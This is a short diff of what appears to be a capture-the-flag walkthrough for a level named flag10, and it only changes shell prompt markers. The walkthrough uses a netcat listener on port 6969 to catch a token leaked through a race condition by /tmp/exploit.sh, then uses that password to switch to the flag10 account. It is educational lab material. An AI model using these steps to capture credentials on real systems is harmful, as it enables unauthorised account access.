@@ -11,19 +11,19 @@ We place the said script as /tmp/exploit.sh, ready to be launched.
 To get the file, we simply use netcat to listen the 6969 port (with another terminal).
 
 Terminal 1:
--> nc -k -l 6969
+$> nc -k -l 6969
 
 Terminal 2:
 
--> sh /tmp/exploit.sh
+$> sh /tmp/exploit.sh
 
 Terminal 1:
 
 -> woupa2yuojeeaaed06riuj63c appears after some times (it is a race condition,
 so the number of tries may vary).
 
--> su flag10
--> woupa2yuojeeaaed06riuj63c
--> geflag
+$> su flag10
+$> woupa2yuojeeaaed06riuj63c
+$> geflag
 
 We can now get the next flag.
